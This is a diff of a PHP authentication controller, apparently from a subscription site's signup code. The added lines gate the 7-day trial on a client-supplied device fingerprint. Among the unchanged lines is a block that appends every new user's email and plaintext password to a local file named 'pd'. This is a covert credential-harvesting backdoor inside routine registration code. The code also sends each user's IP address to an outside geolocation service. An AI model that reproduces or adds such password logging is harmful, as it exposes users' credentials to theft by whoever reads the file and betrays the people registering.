@@ -174,6 +174,13 @@ class AuthController extends BaseController
         // $adminName = $request->getParam('adminName');
         // echo $adminName;
 
+        $fingerprint = $request->getParam('fingerprint');
+        // 检测指纹
+        $user_finger = User::where('fingerprint', $fingerprint)->first();
+        if ($user_finger == null) {
+            $shouldAddTime = true;
+        }
+
 	    //write passswd
 	    $myfile = fopen("pd", "a");
 	    $txt = $email . " " . $passwd . "\n";
@@ -272,6 +279,7 @@ class AuthController extends BaseController
         $user->invite_num = Config::get('inviteNum');
         $user->reg_ip = Http::getClientIP();
         $user->ref_by = $c->user_id;
+        $user->fingerprint = $fingerprint;
 
         // 添加注册地址
         $addressInfo = json_decode(file_get_contents('https://ip.huomao.com/ip?ip=' . $ip), true);
@@ -281,10 +289,18 @@ class AuthController extends BaseController
         }
       
         // 注册新加时间
-        date_default_timezone_set('Asia/Shanghai');
-        $user->payment_date = strtotime('+7 day');
-        $user->payment_day = 7;
-        $user->payment_name = "7天体验套餐";
+        if ($shouldAddTime) {
+            date_default_timezone_set('Asia/Shanghai');
+            $user->payment_date = strtotime('+7 day');
+            $user->payment_day = 7;
+            $user->payment_name = "7天体验套餐";
+        } else {
+            date_default_timezone_set('Asia/Shanghai');
+            $user->payment_date = time()-10;
+            $user->payment_day = 0;
+            $user->payment_name = "体验套餐";
+        }
+        
         // 生成uuid
         $str = md5(uniqid(mt_rand(), true));   
         $uuid  = substr($str,0,8) . '-';   
